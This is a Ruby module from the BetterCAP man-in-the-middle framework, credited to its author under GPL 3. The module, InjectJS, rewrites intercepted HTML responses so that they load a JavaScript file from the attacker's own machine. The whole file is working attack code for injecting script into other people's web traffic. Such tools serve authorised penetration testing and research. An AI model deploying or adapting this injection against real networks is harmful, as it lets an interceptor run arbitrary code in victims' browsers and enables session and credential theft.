=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class InjectJS < Proxy::Module
  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      Logger.info "Injecting javascript file into http://#{request.host}#{request.url} page"
      # get the local interface address and HTTPD port
      localaddr = Context.get.ifconfig[:ip_saddr]
      localport = Context.get.options[:httpd_port]
      # inject the js
      response.body.sub!( '</title>', "</title><script src='http://#{localaddr}:#{localport}/file.js' type='text/javascript'></script>" )
    end
  end
end